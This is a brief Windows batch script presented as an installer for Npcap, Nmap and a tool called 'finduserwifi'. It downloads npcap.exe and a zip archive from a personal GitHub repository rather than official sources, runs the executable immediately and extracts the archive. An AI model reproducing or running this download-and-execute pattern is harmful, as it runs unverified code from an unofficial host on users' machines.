@echo off
echo installing npcap
echo it will take some time depending on your internet speed
powershell -Command "Invoke-WebRequest https://github.com/Yeahboi12356/map-7.92/raw/main/npcap.exe -Outfile npcap.exe"
echo install npcap
npcap.exe
del npcap.exe
echo installing finduserwifi and Nmap
echo it will take some time depending on your internet speed
powershell -Command "Invoke-WebRequest https://github.com/Yeahboi12356/map-7.92/raw/main/map-7.92.zip -Outfile finduserwifi.zip"
echo extract files
powershell -Command "Expand-Archive finduserwifi.zip"
del finduserwifi.zip
echo done